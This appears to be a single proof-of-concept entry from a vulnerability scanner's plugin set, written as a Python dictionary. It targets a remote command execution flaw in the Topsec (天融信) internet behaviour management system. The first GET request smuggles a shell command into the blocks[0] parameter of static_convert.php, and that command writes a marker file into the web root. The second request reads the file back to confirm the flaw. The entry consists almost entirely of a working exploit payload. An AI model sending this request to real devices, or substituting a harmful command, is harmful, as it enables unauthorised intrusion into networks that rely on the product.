{
        'name': '​天融信-上网行为管理系统远程命令执行',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '''/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20'123'%20>>%20/var/www/html/1.txt%0A''',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
	'Accept-Language': 'zh-CN,zh;q=0.9',
	'Content-Type': 'application/x-www-form-urlencoded'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '''/1.txt''',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
	'Accept-Language': 'zh-CN,zh;q=0.9',
	'Content-Type': 'application/x-www-form-urlencoded'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '123'
        }}]
    }